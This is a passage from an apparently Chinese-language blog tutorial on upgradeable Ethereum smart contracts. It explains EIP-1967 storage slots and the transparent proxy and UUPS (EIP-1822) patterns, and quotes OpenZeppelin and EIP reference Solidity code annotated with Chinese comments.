class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs solidity">const proxyAddress = &#x27;0x9fe46736679d2d9a65f0992f2272de9f3c7fa6e0&#x27;<br><br>async function main() &#123;<br>    console.log(proxyAddress,&quot; original Box(proxy) address&quot;)<br>    const BoxV2 = await ethers.getContractFactory(&quot;BoxV2&quot;)<br>    console.log(&quot;upgrade to BoxV2...&quot;)<br>    const boxV2 = await upgrades.upgradeProxy(proxyAddress, BoxV2)<br>    console.log(boxV2.address,&quot; BoxV2 address(should be the same)&quot;)<br><br>    console.log(await upgrades.erc1967.getImplementationAddress(boxV2.address),&quot; getImplementationAddress&quot;)<br>    console.log(await upgrades.erc1967.getAdminAddress(boxV2.address), &quot; getAdminAddress&quot;)<br>&#125;<br><br>main().catch((error) =&gt; &#123;<br>    console.error(error)<br>    process.exitCode = 1<br>&#125;)<br></code></pre></td></tr></table></figure><p>为了避免与代理后面的实现协定的存储变量发生冲突，我们使用<a href="https://eips.ethereum.org/EIPS/eip-1967">EIP1967</a>存储槽。</p><ul><li><a href="https://docs.openzeppelin.com/contracts/4.x/api/proxy#ERC1967Upgrade"><code>ERC1967Upgrade</code></a>：用于获取和设置 EIP1967 中定义的存储插槽的内部函数。</li><li><a href="https://docs.openzeppelin.com/contracts/4.x/api/proxy#ERC1967Proxy"><code>ERC1967Proxy</code></a>：使用 EIP1967 存储插槽的代理。默认情况下不可升级。</li></ul><p>有两种替代方法可以向 ERC1967 代理添加可升级性。它们的差异在下面透明与 UUPS 代理中进行了解释。</p><ul><li><a href="https://docs.openzeppelin.com/contracts/4.x/api/proxy#TransparentUpgradeableProxy"><code>TransparentUpgradeableProxy</code></a>：具有内置管理和升级界面的代理。</li><li><a href="https://docs.openzeppelin.com/contracts/4.x/api/proxy#UUPSUpgradeable"><code>UUPSUpgradeable</code></a>：一种包含在实施合同中的可升级性机制。</li></ul><h4 id="透明代理模式"><a href="#透明代理模式" class="headerlink" title="透明代理模式"></a>透明代理模式</h4><p><a href="https://blog.openzeppelin.com/the-transparent-proxy-pattern/">透明代理模式 - OpenZeppelin 博客</a></p><p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/tree/master/contracts/proxy/transparent">transparent示例代码</a></p><p>目的：为了解决函数冲突问题</p><p>透明代理，有三方参与：代理合约、逻辑合约和管理合约。</p><p><img src="/2022/11/13/upgradeable/image-20221104173019245.png" alt="image-20221104173019245"></p><p>我们处理此问题的方法是通过透明代理模式。透明代理的目标是用户无法与实际逻辑协定区分开来。这意味着调用代理的用户应始终最终执行逻辑协定中的函数，而不是代理管理函数。<code>upgradeTo</code></p><p>那么，我们如何允许代理管理呢？答案基于<em>邮件发件人</em>。透明代理将根据调用方地址决定将哪些调用委托给底层逻辑协定：</p><ul><li>如果调用方是代理的管理员，则代理<strong>不会</strong> delegate any calls，而只会应答它理解的管理消息。</li><li>如果调用方是任何其他地址，则代理将<strong>始终</strong> delegate the calls，无论它是否与代理自己的功能之一匹配。</li></ul><p>让我们在示例中看看它是如何工作的。假设一个带有 angetter 和 anfunction 的代理，该代理将调用委托给具有 angetter 和 afunction 的 ERC20 合约。下表涵盖了所有生成的方案：<code>owner()</code> <code>upgradeTo()</code> <code>owner()</code> <code>transfer()</code></p><p><img src="/2022/11/13/upgradeable/image-20221104171454827.png" alt="image-20221104171454827"></p><p>这些属性意味着<strong>管理员帐户只能用于管理员操作</strong>，例如升级代理或更改 管理员，因此最好是不用于其他任何用途的专用帐户。这将避免头痛 尝试从代理实现调用函数时突然出错。</p><p>虽然这是最安全的方法，但它可能会导致令人困惑的情况。例如，如果用户创建逻辑协定的代理，然后立即尝试与之交互（按照上面的示例，通过调用），他们将收到还原错误。这是因为来自代理管理员的任何调用都不会委托给逻辑协定。<code>transfer()</code></p><h5 id="TransparentUpgradeableProxy"><a href="#TransparentUpgradeableProxy" class="headerlink" title="TransparentUpgradeableProxy"></a>TransparentUpgradeableProxy</h5><p>该合约实现了一个由管理员升级的代理。</p><ol><li>如果管理员以外的任何帐户调用代理，则调用将转发到实现，即使 该调用与代理本身公开的管理函数之一匹配。</li><li>如果管理员调用代理，它可以访问管理功能，但其调用永远不会转发到 实现。如果管理员尝试在实现上调用函数，它将失败并显示错误 “管理员无法回退到代理目标”。</li></ol><p>这些属性意味着管理员帐户只能用于管理员操作，例如升级代理或更改 管理员，因此最好是不用于其他任何用途的专用帐户。这将避免头痛 尝试从代理实现调用函数时突然出错。</p><p>我们建议将专用帐户作为<a href="https://docs.openzeppelin.com/contracts/4.x/api/proxy#ProxyAdmin"><code>代理管理员</code></a>合同的实例。如果以这种方式设置， 您应该将实例视为代理的真正管理界面。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>// OpenZeppelin Contracts (last updated v4.7.0) (proxy/transparent/TransparentUpgradeableProxy.sol)<br><br>pragma solidity ^0.8.0;<br><br>import &quot;../ERC1967/ERC1967Proxy.sol&quot;;<br><br>/**<br> * @dev This contract implements a proxy that is upgradeable by an admin.<br> *<br> * To avoid https://medium.com/nomic-labs-blog/malicious-backdoors-in-ethereum-proxies-62629adf3357[proxy selector<br> * clashing], which can potentially be used in an attack, this contract uses the<br> * https://blog.openzeppelin.com/the-transparent-proxy-pattern/[transparent proxy pattern]. This pattern implies two<br> * things that go hand in hand:<br> *<br> * 1. If any account other than the admin calls the proxy, the call will be forwarded to the implementation, even if<br> * that call matches one of the admin functions exposed by the proxy itself.<br> * 2. If the admin calls the proxy, it can access the admin functions, but its calls will never be forwarded to the<br> * implementation. If the admin tries to call a function on the implementation it will fail with an error that says<br> * &quot;admin cannot fallback to proxy target&quot;.<br> *<br> * These properties mean that the admin account can only be used for admin actions like upgrading the proxy or changing<br> * the admin, so it&#x27;s best if it&#x27;s a dedicated account that is not used for anything else. This will avoid headaches due<br> * to sudden errors when trying to call a function from the proxy implementation.<br> *<br> * Our recommendation is for the dedicated account to be an instance of the &#123;ProxyAdmin&#125; contract. If set up this way,<br> * you should think of the `ProxyAdmin` instance as the real administrative interface of your proxy.<br> */<br>contract TransparentUpgradeableProxy is ERC1967Proxy &#123;<br>    /**<br>     * @dev Initializes an upgradeable proxy managed by `_admin`, backed by the implementation at `_logic`, and<br>     * optionally initialized with `_data` as explained in &#123;ERC1967Proxy-constructor&#125;.<br>     */<br>    //  初始化由 `_admin` 管理的可升级代理，由 `_logic` 作为逻辑合约，以及如 &#123;ERC1967Proxy-constructor&#125; 中所述，可选择使用 `_data` 进行初始化。<br>    constructor(<br>        address _logic,<br>        address admin_,<br>        bytes memory _data<br>    ) payable ERC1967Proxy(_logic, _data) &#123;<br>        _changeAdmin(admin_);<br>    &#125;<br><br>    /**<br>     * @dev Modifier used internally that will delegate the call to the implementation unless the sender is the admin.<br>     */<br>    //  如果不是管理员，则会使用 delegatecall 来调用逻辑合约<br>    modifier ifAdmin() &#123;<br>        if (msg.sender == _getAdmin()) &#123;<br>            _;<br>        &#125; else &#123;<br>            _fallback();<br>        &#125;<br>    &#125;<br><br>    /**<br>     * @dev Returns the current admin.<br>     *<br>     * NOTE: Only the admin can call this function. See &#123;ProxyAdmin-getProxyAdmin&#125;.<br>     *<br>     * TIP: To get this value clients can read directly from the storage slot shown below (specified by EIP1967) using the<br>     * https://eth.wiki/json-rpc/API#eth_getstorageat[`eth_getStorageAt`] RPC call.<br>     * `0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103`<br>     */<br>    // 只有管理员能调用这个函数 <br>    function admin() external ifAdmin returns (address admin_) &#123;<br>        admin_ = _getAdmin();<br>    &#125;<br><br>    /**<br>     * @dev Returns the current implementation.<br>     *<br>     * NOTE: Only the admin can call this function. See &#123;ProxyAdmin-getProxyImplementation&#125;.<br>     *<br>     * TIP: To get this value clients can read directly from the storage slot shown below (specified by EIP1967) using the<br>     * https://eth.wiki/json-rpc/API#eth_getstorageat[`eth_getStorageAt`] RPC call.<br>     * `0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc`<br>     */<br>    //  返回当前的逻辑合约<br>    function implementation() external ifAdmin returns (address implementation_) &#123;<br>        implementation_ = _implementation();<br>    &#125;<br><br>    /**<br>     * @dev Changes the admin of the proxy.<br>     *<br>     * Emits an &#123;AdminChanged&#125; event.<br>     *<br>     * NOTE: Only the admin can call this function. See &#123;ProxyAdmin-changeProxyAdmin&#125;.<br>     */<br>    function changeAdmin(address newAdmin) external virtual ifAdmin &#123;<br>        _changeAdmin(newAdmin);<br>    &#125;<br><br>    /**<br>     * @dev Upgrade the implementation of the proxy.<br>     *<br>     * NOTE: Only the admin can call this function. See &#123;ProxyAdmin-upgrade&#125;.<br>     */<br>    // 升级逻辑合约 <br>    function upgradeTo(address newImplementation) external ifAdmin &#123;<br>        _upgradeToAndCall(newImplementation, bytes(&quot;&quot;), false);<br>    &#125;<br><br>    /**<br>     * @dev Upgrade the implementation of the proxy, and then call a function from the new implementation as specified<br>     * by `data`, which should be an encoded function call. This is useful to initialize new storage variables in the<br>     * proxied contract.<br>     *<br>     * NOTE: Only the admin can call this function. See &#123;ProxyAdmin-upgradeAndCall&#125;.<br>     */<br>    // 升级逻辑合约，并额外使用 delegatecall 调用 data<br>    function upgradeToAndCall(address newImplementation, bytes calldata data) external payable ifAdmin &#123;<br>        _upgradeToAndCall(newImplementation, data, true);<br>    &#125;<br><br>    /**<br>     * @dev Returns the current admin.<br>     */<br>    // 返回现在的管理员 <br>    function _admin() internal view virtual returns (address) &#123;<br>        return _getAdmin();<br>    &#125;<br><br>    /**<br>     * @dev Makes sure the admin cannot access the fallback function. See &#123;Proxy-_beforeFallback&#125;.<br>     */<br>    // 确保管理员无法访问 Fallback 函数<br>    function _beforeFallback() internal virtual override &#123;<br>        require(msg.sender != _getAdmin(), &quot;TransparentUpgradeableProxy: admin cannot fallback to proxy target&quot;);<br>        super._beforeFallback();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="ProxyAdmin"><a href="#ProxyAdmin" class="headerlink" title="ProxyAdmin"></a>ProxyAdmin</h5><p>这是一个辅助合同，旨在被分配为<a href="https://docs.openzeppelin.com/contracts/4.x/api/proxy#TransparentUpgradeableProxy"><code>TransparentUpgradeableProxy</code></a> 的管理员。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>// OpenZeppelin Contracts v4.4.1 (proxy/transparent/ProxyAdmin.sol)<br><br>pragma solidity ^0.8.0;<br><br>import &quot;./TransparentUpgradeableProxy.sol&quot;;<br>import &quot;../../access/Ownable.sol&quot;;<br><br>/**<br> * @dev This is an auxiliary contract meant to be assigned as the admin of a &#123;TransparentUpgradeableProxy&#125;. For an<br> * explanation of why you would want to use this see the documentation for &#123;TransparentUpgradeableProxy&#125;.<br> */<br>contract ProxyAdmin is Ownable &#123;<br>    /**<br>     * @dev Returns the current implementation of `proxy`.<br>     *<br>     * Requirements:<br>     *<br>     * - This contract must be the admin of `proxy`.<br>     */<br>    // 返回代理合约的逻辑合约，并要求此合约必须是代理合约的管理员 <br>    function getProxyImplementation(TransparentUpgradeableProxy proxy) public view virtual returns (address) &#123;<br>        // We need to manually run the static call since the getter cannot be flagged as view<br>        // bytes4(keccak256(&quot;implementation()&quot;)) == 0x5c60da1b<br>        (bool success, bytes memory returndata) = address(proxy).staticcall(hex&quot;5c60da1b&quot;);<br>        require(success);<br>        return abi.decode(returndata, (address));<br>    &#125;<br><br>    /**<br>     * @dev Returns the current admin of `proxy`.<br>     *<br>     * Requirements:<br>     *<br>     * - This contract must be the admin of `proxy`.<br>     */<br>    // 返回代理合约的管理员，并要求此合约必须是代理合约的管理员 <br>    function getProxyAdmin(TransparentUpgradeableProxy proxy) public view virtual returns (address) &#123;<br>        // We need to manually run the static call since the getter cannot be flagged as view<br>        // bytes4(keccak256(&quot;admin()&quot;)) == 0xf851a440<br>        (bool success, bytes memory returndata) = address(proxy).staticcall(hex&quot;f851a440&quot;);<br>        require(success);<br>        return abi.decode(returndata, (address));<br>    &#125;<br><br>    /**<br>     * @dev Changes the admin of `proxy` to `newAdmin`.<br>     *<br>     * Requirements:<br>     *<br>     * - This contract must be the current admin of `proxy`.<br>     */<br>    // 更改代理合约的管理员，并要求此合约必须是代理合约的管理员<br>    function changeProxyAdmin(TransparentUpgradeableProxy proxy, address newAdmin) public virtual onlyOwner &#123;<br>        proxy.changeAdmin(newAdmin);<br>    &#125;<br><br>    /**<br>     * @dev Upgrades `proxy` to `implementation`. See &#123;TransparentUpgradeableProxy-upgradeTo&#125;.<br>     *<br>     * Requirements:<br>     *<br>     * - This contract must be the admin of `proxy`.<br>     */<br>    // 升级，并要求此合约必须是代理合约的管理员  <br>    function upgrade(TransparentUpgradeableProxy proxy, address implementation) public virtual onlyOwner &#123;<br>        proxy.upgradeTo(implementation);<br>    &#125;<br><br>    /**<br>     * @dev Upgrades `proxy` to `implementation` and calls a function on the new implementation. See<br>     * &#123;TransparentUpgradeableProxy-upgradeToAndCall&#125;.<br>     *<br>     * Requirements:<br>     *<br>     * - This contract must be the admin of `proxy`.<br>     */<br>    // 升级，额外使用 delegatecall 调用 data，并要求此合约必须是代理合约的管理员 <br>    function upgradeAndCall(<br>        TransparentUpgradeableProxy proxy,<br>        address implementation,<br>        bytes memory data<br>    ) public payable virtual onlyOwner &#123;<br>        proxy.upgradeToAndCall&#123;value: msg.value&#125;(implementation, data);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h5 id="逻辑合约"><a href="#逻辑合约" class="headerlink" title="逻辑合约"></a>逻辑合约</h5><p>就算逻辑合约里有<code>upgradeTo</code>等方法，也不会影响调用。因为普通用户就直接在代理合约判断<code>ifAdmin</code>的时候就转到了逻辑合约里，而管理合约的调用，就会放行到代理合约直接执行。</p><h5 id="管理合约"><a href="#管理合约" class="headerlink" title="管理合约"></a>管理合约</h5><p>仅仅是回调参数传过来的proxy的同名函数。整个管理合约是否可以调用proxy的函数，是在proxy代理合约里判断的。所以管理合约很轻量。</p><h5 id="合约升级"><a href="#合约升级" class="headerlink" title="合约升级"></a>合约升级</h5><p>用代理合约地址，直接调用管理合约的<code>upgrade</code>或者<code>upgradeAndCall</code>方法即可。</p><h4 id="UUPS"><a href="#UUPS" class="headerlink" title="UUPS"></a>UUPS</h4><p>也就是 EIP1822</p><h5 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h5><p>EIP-1822讨论的合约升级模式与Openzeppelin的透明合约升级模式的不同点在于：EIP-1822的代理合约只读取实现合约的地址，并将所有的方法都代理给实现合约，包括修改实现合约地址的逻辑部分也在实现合约里。而透明合约升级模式中，proxy合约管理着实现合约的地址，要实现合约升级，只需要在proxy合约中更改实现合约的地址即可。其他的逻辑代理给实现合约。</p><p>也就是说EIP-1822的实现合约既包含了普通的业务逻辑处理，更包含了自身的升级逻辑处理。简单来讲就是EIP-1822的实现合约部分，都需要继承自一个公共的可升级实现合约：proxiable.sol。在可升级的实现合约proxiable中，实现如下方法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">proxiableUUID</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">pure</span> <span class="hljs-title">returns</span> (<span class="hljs-params">bytes32</span>) </span>&#123;<br><span class="hljs-comment">//作用是一个flag，用来判断是否返回特定值keccak256(&quot;PROXIABLE&quot;)，以判断该合约是否是一个实现了EIP-1822的可升级实现合约</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">updateCodeAddress</span>(<span class="hljs-params">address newAddress</span>) <span class="hljs-title">ineternal</span> </span>&#123;<br><span class="hljs-comment">//简单来讲就是更新实际逻辑实现合约的地址</span><br><span class="hljs-built_in">require</span>(<span class="hljs-built_in">this</span>.proxiableUUID() == Proxiable(newAddress).proxiableUUID());<br>bytes32 proxiableUUID_ = <span class="hljs-built_in">this</span>.proxiableUUID();<br>assembly&#123;<br> sstore(proxiableUUID_, newAddress)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后在实现合约中，所有的实现合约都继承自proxiable合约，然后实现自己的逻辑即可。因为代理合约只是从插槽<code>keccak256(&quot;PROXIABLE&quot;)</code>处读取实现合约的地址，而实现合约可以通过proxiable中的updateCodeAddress方法来更新这个地址，从而实现代理合约中对应插槽<code>keccak256(&quot;PROXIABLE&quot;)</code>位置处的地址改变为目标地址。</p><p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/tree/master/contracts/proxy/utils">UUPS 代码</a></p><p><a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-1822.md">EIP1822 官方文档</a></p><p><a href="https://ethereum-magicians.org/t/eip-1822-universal-upgradeable-proxy-standard-uups/2842">EIP1822 讨论</a></p><p><a href="https://blog.logrocket.com/using-uups-proxy-pattern-upgrade-smart-contracts/">UUPS + hardhat</a></p><p><img src="/2022/11/13/upgradeable/image-20221104172156181.png" alt="image-20221104172156181"></p><p>UUPS 代理模式类似于透明代理模式</p><p>用户和代理合约交互，代理合约不直接实现<code>upgradeTo</code>和<code>upgradeToAndCall</code>，由逻辑合约实现。</p><p>EIP-1822 使用 <code>keccak256(&quot;PROXIABLE&quot;) = &quot;0xc5f16f0fcc639fa48a6947836d9850f504798523bf8c9a3a87d5876cf622bcf7&quot;</code> 存储槽中的结果。它不是 100% 随机的，但足够随机，因此不会发生碰撞。至少在正常情况下。您可以深入<a href="https://docs.soliditylang.org/en/v0.8.2/internals/layout_in_storage.html#layout-of-state-variables-in-storage">研究 Solidity 中的存储变量布局，</a>然后您会发现几乎没有机会产生碰撞。</p><p>OpenZeppelin 建议使用 UUPS 模式，因为它更省气。但是何时使用 UUPS 的决定实际上是基于几个因素，例如项目的业务需求等等。</p><p>UUPS 最初的动机是在主网上部署许多智能合约钱包。逻辑可以部署一次。代理可以为每个新钱包部署数百次，而无需花费太多 gas。</p><p>由于升级方法存在于逻辑合约中，如果协议未来想要完全去除可升级性，开发者可以选择 UUPS。</p><h5 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h5><p>接口合约</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>// OpenZeppelin Contracts (last updated v4.5.0) (interfaces/draft-IERC1822.sol)<br><br>pragma solidity ^0.8.0;<br><br>/**<br> * @dev ERC1822: Universal Upgradeable Proxy Standard (UUPS) documents a method for upgradeability through a simplified<br> * proxy whose upgrades are fully controlled by the current implementation.<br> */<br>interface IERC1822Proxiable &#123;<br>    /**<br>     * @dev Returns the storage slot that the proxiable contract assumes is being used to store the implementation<br>     * address.<br>     *<br>     * IMPORTANT: A proxy pointing at a proxiable contract should not be considered proxiable itself, because this risks<br>     * bricking a proxy that upgrades to it, by delegating to itself until out of gas. Thus it is critical that this<br>     * function revert if invoked through a proxy.<br>     */<br>    // 返回可代理合约假定用于存储实现地址的存储槽。<br>    // 指向可代理合约的代理本身不应该被认为是可代理的，因为这可能会通过委托给自己直到耗尽gas而破坏升级到它的代理。 因此，如果通过代理调用此函数，则该函数revert至关重要。 <br>    function proxiableUUID() external view returns (bytes32);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>代理合约</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.5.1;<br><br>contract Proxy &#123;<br>    // Code position in storage is keccak256(&quot;PROXIABLE&quot;) = &quot;0xc5f16f0fcc639fa48a6947836d9850f504798523bf8c9a3a87d5876cf622bcf7&quot;<br>    // 提议的构造函数接受任意数量的任何类型的参数，因此与任何逻辑合约构造函数兼容。<br>    // 此外，代理合约构造函数的任意性质提供了从逻辑合约源代码中可用的一个或多个构造函数中进行选择的能力（例如constructor1，constructor2...等）。请注意，如果逻辑契约中包含多个构造函数，则应包含一个检查以禁止在初始化后再次调用构造函数。<br>    // 值得注意的是，支持多个构造函数的新增功能不会抑制对 Proxy Contract 字节码的验证，因为初始化 tx 调用数据（输入）可以先使用 Proxy Contract ABI，然后使用 Logic Contract ABI 进行解码。<br>    constructor(bytes memory constructData, address contractLogic) public &#123;<br>        // save the code address<br>        assembly &#123; // solium-disable-line<br>            sstore(0xc5f16f0fcc639fa48a6947836d9850f504798523bf8c9a3a87d5876cf622bcf7, contractLogic)<br>        &#125;<br>        (bool success, bytes memory _ ) = contractLogic.delegatecall(constructData); // solium-disable-line<br>        require(success, &quot;Construction failed&quot;);<br>    &#125;<br><br>    // 将逻辑合约的地址存储在定义的存储位置keccak256(&quot;PROXIABLE&quot;)。这消除了代理和逻辑合约中的变量之间发生冲突的可能性，从而提供了与任何逻辑合约的“通用”兼容性。<br>    function() external payable &#123;<br>        assembly &#123; // solium-disable-line<br>            let contractLogic := sload(0xc5f16f0fcc639fa48a6947836d9850f504798523bf8c9a3a87d5876cf622bcf7)<br>            calldatacopy(0x0, 0x0, calldatasize)<br>            let success := delegatecall(sub(gas, 10000), contractLogic, 0x0, calldatasize, 0, 0)<br>            let retSz := returndatasize<br>            returndatacopy(0, 0, retSz)<br>            switch success<br>            case 0 &#123;<br>                revert(0, retSz)<br>            &#125;<br>            default &#123;<br>                return(0, retSz)<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>逻辑合约</p><p>Proxiable Contract 包含在 Logic Contract 中，并提供执行升级所需的功能。兼容性检查<code>proxiable</code>可防止升级期间出现无法修复的更新。</p><p>警告：<code>updateCodeAddress</code>并且<code>proxiable</code>必须存在于逻辑合约中。未能包含这些可能会阻止升级，并可能使代理合约变得完全无法使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Proxiable &#123;<br>    // Code position in storage is keccak256(&quot;PROXIABLE&quot;) = &quot;0xc5f16f0fcc639fa48a6947836d9850f504798523bf8c9a3a87d5876cf622bcf7&quot;<br><br>    // 兼容性检查以确保新的逻辑合约实现通用可升级代理标准。请注意，为了支持未来的实现，bytes32可以更改比较，例如keccak256(&quot;PROXIABLE-ERC1822-v1&quot;).<br>    function updateCodeAddress(address newAddress) internal &#123;<br>        require(<br>            bytes32(0xc5f16f0fcc639fa48a6947836d9850f504798523bf8c9a3a87d5876cf622bcf7) == Proxiable(newAddress).proxiableUUID(),<br>            &quot;Not compatible&quot;<br>        );<br>        assembly &#123; // solium-disable-line<br>            sstore(0xc5f16f0fcc639fa48a6947836d9850f504798523bf8c9a3a87d5876cf622bcf7, newAddress)<br>        &#125;<br>    &#125;<br>    // 